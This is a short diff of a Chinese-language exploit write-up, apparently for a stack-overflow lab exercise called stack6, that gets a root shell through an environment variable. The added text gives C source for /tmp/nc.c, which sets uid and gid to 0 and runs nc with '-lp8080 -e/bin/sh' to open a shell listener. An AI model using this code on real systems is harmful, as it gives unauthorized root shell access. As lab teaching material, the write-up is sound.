@@ -136,8 +136,6 @@ getaddress.c
 
 ![](/png/34.png)
 
-
-
 \#include &lt;stdio.h&gt;
 
 \#include &lt;stdlib.h&gt;
@@ -172,7 +170,25 @@ stack6.py 的脚本如下：
 
 根据反馈信息，地址做了微调。程序最后返回root.
 
-那么，现在做一下验证，再把TTE环境变量改回"/bin/sh"试试看。
+那么，现在做一下验证，再把TTE环境变量改回"/bin/sh"试，不好用。为了得到一个shell，我们采用将环境变量设置为可以反弹shell的nc程序。
+
+在/tmp目录下编写nc.c
+
+\#include &lt;stdlib.h&gt;
+
+
+
+int main\(int argc, char \*\*argv, char \*\*envp\) {
+
+    setuid\(0\); // These two are necessary, as system\(\) drops privileges
+
+    setgid\(0\);
+
+    char \*args\[\] = {  "nc", "-lp8080", "-e/bin/sh", \(char \*\) 0 };
+
+    execve\("/bin/nc", args, envp\);
+
+}
 
 
 
